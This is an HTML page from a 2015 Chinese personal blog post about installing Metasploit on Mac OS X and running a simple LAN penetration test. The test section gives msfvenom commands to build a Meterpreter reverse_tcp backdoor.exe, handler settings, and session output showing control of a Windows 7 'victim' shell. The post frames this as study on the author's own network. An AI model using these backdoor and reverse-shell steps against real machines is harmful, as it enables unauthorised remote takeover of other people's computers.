@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
+  <title>Metasploit折腾小记 | Hsmouc</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="还是写在文前：怎么说呢，折腾这个东西我的内心是很复杂的。一个美好的用来写模电和概率和大物的周日就这么没了ˊ_&amp;gt;ˋ哎呀，可是人家就是这么执着的跳坑怎么破。还是和以往一样，这篇文章的相关技术仅供学习，千万不要做出一些危险出格的事情。
+
+Metasploit的安装这一部分真的是让我的心都碎了，也是最难折腾的。在YouTube上面找了好多视频，永远都是人家一路回车，我一路报错，果然是人品用完的节奏。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Metasploit折腾小记">
+<meta property="og:url" content="http://yoursite.com/2015/11/08/2015-11-08-msf/index.html">
+<meta property="og:site_name" content="Hsmouc">
+<meta property="og:description" content="还是写在文前：怎么说呢，折腾这个东西我的内心是很复杂的。一个美好的用来写模电和概率和大物的周日就这么没了ˊ_&amp;gt;ˋ哎呀，可是人家就是这么执着的跳坑怎么破。还是和以往一样，这篇文章的相关技术仅供学习，千万不要做出一些危险出格的事情。
+
+Metasploit的安装这一部分真的是让我的心都碎了，也是最难折腾的。在YouTube上面找了好多视频，永远都是人家一路回车，我一路报错，果然是人品用完的节奏。">
+<meta property="og:image" content="http://ww4.sinaimg.cn/mw690/005WMcFzjw1exupqph2nvj313w0bxack.jpg">
+<meta property="og:updated_time" content="2015-12-17T15:07:56.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Metasploit折腾小记">
+<meta name="twitter:description" content="还是写在文前：怎么说呢，折腾这个东西我的内心是很复杂的。一个美好的用来写模电和概率和大物的周日就这么没了ˊ_&amp;gt;ˋ哎呀，可是人家就是这么执着的跳坑怎么破。还是和以往一样，这篇文章的相关技术仅供学习，千万不要做出一些危险出格的事情。
+
+Metasploit的安装这一部分真的是让我的心都碎了，也是最难折腾的。在YouTube上面找了好多视频，永远都是人家一路回车，我一路报错，果然是人品用完的节奏。">
+  
+    <link rel="alternative" href="/atom.xml" title="Hsmouc" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon">
+  
+  <link rel="stylesheet" href="/css/style.css" type="text/css">
+</head>
+
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img lazy-src="http://ww1.sinaimg.cn/mw690/005WMcFzjw1ewktmv52wbj307y07yjrp.jpg" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/">年糕</a></h1>
+		</hgroup>
+
+		
+
+		
+			<div class="switch-btn">
+				<div class="icon">
+					<div class="icon-ctn">
+						<div class="icon-wrap icon-house" data-idx="0">
+							<div class="birdhouse"></div>
+							<div class="birdhouse_holes"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						
+						<div class="icon-wrap icon-link hide" data-idx="2">
+							<div class="loopback_l"></div>
+							<div class="loopback_r"></div>
+						</div>
+						
+						
+						<div class="icon-wrap icon-me hide" data-idx="3">
+							<div class="user"></div>
+							<div class="shoulder"></div>
+						</div>
+						
+					</div>
+					
+				</div>
+				<div class="tips-box hide">
+					<div class="tips-arrow"></div>
+					<ul class="tips-inner">
+						<li>菜单</li>
+						<li>標籤</li>
+						
+						<li>友情链接</li>
+						
+						
+						<li>關於</li>
+						
+					</ul>
+				</div>
+			</div>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">主页</a></li>
+				        
+							<li><a href="/archives">所有文章</a></li>
+				        
+							<li><a href="/instagram">相册</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+								<a class="github" target="_blank" href="https://github.com/Hsmouc" title="github">github</a>
+					        
+								<a class="weibo" target="_blank" href="http://weibo.com/5449180097/profile?rightmod=1&wvr=6&mod=personinfo&is_all=1" title="weibo">weibo</a>
+					        
+								<a class="facebook" target="_blank" href="https://www.facebook.com/profile.php?id=100009396457642" title="facebook">facebook</a>
+					        
+								<a class="google" target="_blank" href="https://plus.google.com/u/0/101351542677141027265" title="google">google</a>
+					        
+						</div>
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/ARP/" style="font-size: 10px;">ARP</a> <a href="/tags/Blog/" style="font-size: 15px;">Blog</a> <a href="/tags/C/" style="font-size: 20px;">C++</a> <a href="/tags/Javascript/" style="font-size: 10px;">Javascript</a> <a href="/tags/Jekyll/" style="font-size: 10px;">Jekyll</a> <a href="/tags/Landscape/" style="font-size: 10px;">Landscape</a> <a href="/tags/MFC/" style="font-size: 17.5px;">MFC</a> <a href="/tags/Metasploit/" style="font-size: 12.5px;">Metasploit</a> <a href="/tags/OS-X/" style="font-size: 10px;">OS X</a> <a href="/tags/Pi/" style="font-size: 12.5px;">Pi</a> <a href="/tags/Wi-Fi/" style="font-size: 15px;">Wi-Fi</a> <a href="/tags/review/" style="font-size: 10px;">review</a>
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://lyeec.me/">墨坊</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+				
+				<section class="switch-part switch-part4">
+				
+					<div id="js-aboutme">工科在读，C/Python学习中，嵌入式开发，前端/渗透/摄影/吃货ˉ﹃ˉ</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
+
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide">年糕</h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+			
+				<img lazy-src="http://ww1.sinaimg.cn/mw690/005WMcFzjw1ewktmv52wbj307y07yjrp.jpg" class="js-avatar">
+			
+			</div>
+			<hgroup>
+			  <h1 class="header-author">年糕</h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+					<li><a href="/archives">所有文章</a></li>
+		        
+					<li><a href="/instagram">相册</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+						<a class="github" target="_blank" href="https://github.com/Hsmouc" title="github">github</a>
+			        
+						<a class="weibo" target="_blank" href="http://weibo.com/5449180097/profile?rightmod=1&wvr=6&mod=personinfo&is_all=1" title="weibo">weibo</a>
+			        
+						<a class="facebook" target="_blank" href="https://www.facebook.com/profile.php?id=100009396457642" title="facebook">facebook</a>
+			        
+						<a class="google" target="_blank" href="https://plus.google.com/u/0/101351542677141027265" title="google">google</a>
+			        
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+
+      <div class="body-wrap"><article id="post-2015-11-08-msf" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2015/11/08/2015-11-08-msf/" class="article-date">
+  	<time datetime="2015-11-08T03:40:25.000Z" itemprop="datePublished">2015-11-08</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Metasploit折腾小记
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Metasploit/">Metasploit</a></li></ul>
+	</div>
+
+        
+	<div class="article-category tagcloud">
+	<a class="article-category-link" href="/categories/渗透入侵/">渗透入侵</a>
+	</div>
+
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <ul>
+<li>还是写在文前：怎么说呢，折腾这个东西我的内心是很复杂的。一个美好的用来写模电和概率和大物的周日就这么没了ˊ_&gt;ˋ哎呀，可是人家就是这么执着的跳坑怎么破。还是和以往一样，这篇文章的相关技术仅供学习，千万不要做出一些危险出格的事情。</li>
+</ul>
+<h3 id="Metasploit_u7684_u5B89_u88C5"><a href="#Metasploit_u7684_u5B89_u88C5" class="headerlink" title="Metasploit的安装"></a>Metasploit的安装</h3><p>这一部分真的是让我的心都碎了，也是最难折腾的。在YouTube上面找了好多视频，永远都是人家一路回车，我一路报错，果然是人品用完的节奏。闲话少说，开始安装，我的系统是Mac OS X 10.10.5，一般大家都是用BT5干这种活啦。</p>
+<ol>
+<li>从Github上克隆Metasploit项目<br>选一个合适的目录，然后在终端里面输入:  </li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone git@github.com:rapid7/metasploit-framework.git</span><br></pre></td></tr></table></figure>
+<p>之后把终端cd到你刚才选择的目录，输入:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure></p>
+<p>报错就对了，因为你没有装蛋疼的依赖环境。</p>
+<ol>
+<li>安装依赖环境<br>2.1 <em>Ruby</em><br>因为我是Mac系统又安装了Xcode，所以已经有了Ruby 1.8的环境，但是后续安装会要求更高的版本，所以我们先更新一下Ruby，推荐使用rvm，具体参见<a href="http://www.inferjay.com/blog/2013/05/09/how-to-install-ruby-1-dot-9-3-in-mac-osx/" target="_blank" rel="external">脉脉不得语的技术博客</a><br>2.2 <em>Homebrew</em><br>这玩意是个OS X的软件管理器，相当好用，我们使用Ruby命令来安装它，下面的安装会用到。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -e <span class="string">"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>我们作死运行下Metasploit，发现还是报错，具体报什么错我也忘记了（哭）。<br>2.3 <em>Nmap</em><br>强大的嗅探器，使用我们刚刚装好的homebrew安装：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">brew install nmap</span><br><span class="line">```    </span><br><span class="line"><span class="number">2.4</span> *bundler*  </span><br><span class="line">就是这货坑死人不偿命，按照教程来说，只需要简单的一句指令：</span><br><span class="line">```c</span><br><span class="line">gem install bundler</span><br></pre></td></tr></table></figure></p>
+<p>我猜你们一定会在安装到nokogiri的时候报错，事实就是这玩意需要自己手动安装，报错提示libiconv is missing，解决方案：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">brew update</span><br><span class="line">xcode-select --install</span><br><span class="line">brew link libiconv--force</span><br><span class="line">gem install nokogiri -- --with-iconv-dir=/usr/local/Cellar/libiconv/<span class="number">1.14</span></span><br></pre></td></tr></table></figure></p>
+<p>再次使用gem install bundler</p>
+<ol>
+<li>安装postgresql并配置。<br>这个我不会-_-#，因为我发现不配置数据库的话Metasploit已经可以使用了，不用数据库的视频教程见<a href="https://www.youtube.com/watch?v=C2CEQupM2PM" target="_blank" rel="external">YouTube</a>.我基本上是按照他的顺序安装的。<br>关于配置数据库的教程：<a href="http://www.freebuf.com/articles/system/36924.html" target="_blank" rel="external">RickGrey</a>(中文教程)、<a href="http://www.darkoperator.com/installing-metasploit-framewor/" target="_blank" rel="external">Darkoperator</a>(英文教程)。<br>其他的相关问题可以在官方的论坛<a href="https://community.rapid7.com/community/metasploit" target="_blank" rel="external">RAPID7COMMUNITY</a>上交流。   </li>
+</ol>
+<h3 id="u4E00_u6B21_u7B80_u5355_u7684_u5185_u7F51_u6E17_u900F"><a href="#u4E00_u6B21_u7B80_u5355_u7684_u5185_u7F51_u6E17_u900F" class="headerlink" title="一次简单的内网渗透"></a>一次简单的内网渗透</h3><ul>
+<li>工具：Mac OS X with Metasploit(Attacker)  Windows 7(Victim)</li>
+<li>原理：通过msfpayload生成后门exe然后上传到目标机器上执行，通过本地监听获得meterpreter shell，并得到shell<h4 id="u751F_u6210_u4E00_u4E2Abackdoor-exe"><a href="#u751F_u6210_u4E00_u4E2Abackdoor-exe" class="headerlink" title="生成一个backdoor.exe"></a>生成一个backdoor.exe</h4>Windows:<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./msfvenom windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; X &gt; backdoor.exe</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>几点说明：如果被攻击的计算机和你在同一局域网下，可以使用LAN IP，用ifconfig即可，如果是WAN攻击则使用WAN IP即可。<br>如果运行sudo ./msfvenom终端提示你安装bundler，自求多福吧，我也不知道怎么解决的。耗了一下午反复装了无数遍最后居然莫名其妙的好了。<br>这里使用的msfvenom是因为软件更新，原先的msfpayload功能已经集成在了msfvenom里了。</p>
+<h4 id="u4E0A_u4F20backdoor-exe_u5E76_u83B7_u5F97shell"><a href="#u4E0A_u4F20backdoor-exe_u5E76_u83B7_u5F97shell" class="headerlink" title="上传backdoor.exe并获得shell"></a>上传backdoor.exe并获得shell</h4><p>直接上指令：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ msfconsole</span><br><span class="line">msf exploit(handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">PAYLOAD =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; set LHOST 192.168.1.3</span><br><span class="line">LHOST =&gt; 192.168.1.3</span><br><span class="line">msf exploit(handler) &gt; set LPORT 4444</span><br><span class="line">LPORT =&gt; 4444</span><br><span class="line">msf exploit(handler) &gt; exploit</span><br></pre></td></tr></table></figure></p>
+<p>在Victim的计算机上双击backdoor.exe，顺利的话会这样：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[*] Started reverse handler on 192.168.1.3:4444</span><br><span class="line">[*] Starting the payload handler...</span><br><span class="line">[*] Sending stage (957486 bytes) to 192.168.1.3</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.1.3:4444 -&gt; 192.168.1.3:54411) at 2015-11-08 22:07:07 +0800</span><br></pre></td></tr></table></figure></p>
+<p>然后输入shell尽情玩耍吧……<br>附上一张截图：<br><img src="http://ww4.sinaimg.cn/mw690/005WMcFzjw1exupqph2nvj313w0bxack.jpg" alt=""><br>由图可见我完全接管了Windows 7的shell，下面就可以随心所欲了23333</p>
+<h3 id="u5C0F_u7ED3"><a href="#u5C0F_u7ED3" class="headerlink" title="小结"></a>小结</h3><p>对于linux来说，遇到错误真的就是Google，复制命令然后祈祷了。装什么东西都要搞一大堆依赖包，不过总体来说还是比较人性化，大多数时候终端会告诉你你需要装什么。Metasploit功能强大，最近在测试的只是基于LAN下的计算机，更深入的问题留作以后探讨。<br>最后用BackTrack Linux上的一句话来作结：</p>
+<blockquote>
+<p>The quieter you become,the more you are able to hear…</p>
+</blockquote>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2015/11/12/2015-11-12-ARP/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          Ettercap使用小结
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2015/10/23/2015-10-23-cppcode4/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">c++ primer 3</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<div class="share_jia">
+	<!-- JiaThis Button BEGIN -->
+	<div class="jiathis_style">
+		<span class="jiathis_txt">分享到: &nbsp; </span>
+		<a class="jiathis_button_facebook"></a> 
+    <a class="jiathis_button_twitter"></a>
+    <a class="jiathis_button_plus"></a> 
+    <a class="jiathis_button_tsina"></a>
+		<a class="jiathis_button_cqq"></a>
+		<a class="jiathis_button_douban"></a>
+		<a class="jiathis_button_weixin"></a>
+		<a class="jiathis_button_tumblr"></a>
+    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
+	</div>
+	<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js?uid=1405949716054953" charset="utf-8"></script>
+	<!-- JiaThis Button END -->
+</div>
+
+
+
+
+
+
+<div class="duoshuo">
+	<!-- 多说评论框 start -->
+	<div class="ds-thread" data-thread-key="2015-11-08-msf" data-title="Metasploit折腾小记" data-url="http://yoursite.com/2015/11/08/2015-11-08-msf/"></div>
+	<!-- 多说评论框 end -->
+	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+	<script type="text/javascript">
+	var duoshuoQuery = {short_name:"hsmouc"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0] 
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+	</script>
+	<!-- 多说公共JS代码 end -->
+</div>
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+    	<div class="footer-left">
+    		&copy; 2015 年糕
+    	</div>
+      	<div class="footer-right">
+      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
+      	</div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css" type="text/css">
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+<script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js" type="text/javascript"></script>
+<script src="/js/main.js" type="text/javascript"></script>
+
+
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  </div>
+</body>
+</html>
